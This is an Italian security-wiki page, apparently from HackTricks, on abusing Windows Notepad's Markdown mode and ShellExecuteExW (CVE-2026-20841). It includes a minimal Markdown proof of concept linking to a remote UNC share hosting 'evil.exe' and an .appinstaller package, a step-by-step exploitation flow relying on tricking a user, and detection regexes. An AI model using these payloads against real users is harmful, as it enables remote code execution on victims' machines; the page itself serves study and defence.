# Abuso di Windows Protocol Handler / ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Le applicazioni Windows che renderizzano Markdown o HTML possono passare i target selezionati a `ShellExecuteExW`. Poiché ShellExecute avvia gli URI scheme e le associazioni di file registrati, un renderer deve usare una allowlist esplicita anziché presumere che ogni link sia HTTP(S). Il comportamento di Notepad descritto di seguito riguarda CVE-2026-20841 e non va generalizzato a tutti i renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## Superficie di ShellExecuteExW nella modalità Markdown di Windows Notepad
- Notepad seleziona la modalità Markdown **solo per le estensioni `.md`** tramite un confronto di stringhe fisso in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Link Markdown supportati:
  - Standard: `[text](target)`
  - Autolink: `<target>` (renderizzato come `[target](target)`), quindi entrambe le sintassi sono importanti per i payload e il rilevamento.
- I clic sui link vengono elaborati in `sub_140170F60()`, che applica un filtraggio debole e poi chiama `ShellExecuteExW`.
- `ShellExecuteExW` avvia **qualsiasi protocol handler configurato**, non solo HTTP(S).<sup>[[1]](#references)</sup>

### Considerazioni sui payload
- Qualsiasi sequenza `\\` nel link viene **normalizzata in `\`** prima di `ShellExecuteExW`, influenzando la creazione e il rilevamento di UNC/path.
- I file `.md` **non sono associati a Notepad per impostazione predefinita**; la vittima deve comunque aprire il file in Notepad e fare clic sul link, ma una volta renderizzato, il link è cliccabile.
- Esempi di scheme pericolosi:<sup>[[1]](#references)</sup>
  - `file://` per avviare un payload locale/UNC.
  - `ms-appinstaller://` per attivare i flussi di App Installer. Anche altri scheme registrati localmente potrebbero essere sfruttabili.

### PoC Markdown minimo
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Flusso di sfruttamento
1. Crea un **file `.md`** in modo che Notepad lo visualizzi come Markdown.
2. Incorpora un link che utilizzi uno schema URI pericoloso (`file:`, `ms-appinstaller:` o qualsiasi gestore installato).
3. Consegna il file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o simili) e convinci l’utente ad aprirlo in Notepad.
4. Al clic, il **link normalizzato** viene passato a `ShellExecuteExW` e il gestore di protocollo corrispondente esegue il contenuto referenziato nel contesto dell’utente.<sup>[[1]](#references)[[2]](#references)</sup>

## Idee per il rilevamento
- Monitora i trasferimenti di file `.md` tramite porte/protocolli comunemente usati per distribuire documenti: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analizza i link Markdown (standard e autolink) e cerca `file:` o `ms-appinstaller:` **senza distinzione tra maiuscole e minuscole**.
- Regex consigliate dai vendor per rilevare l’accesso a risorse remote:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- La correzione del vendor descritta da ZDI limita le destinazioni accettate ai file locali e a HTTP(S). Se necessario, estendi il rilevamento ad altri gestori di protocollo installati, poiché la superficie di attacco registrata varia da un sistema all’altro.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: esecuzione di codice arbitrario in Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC di CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
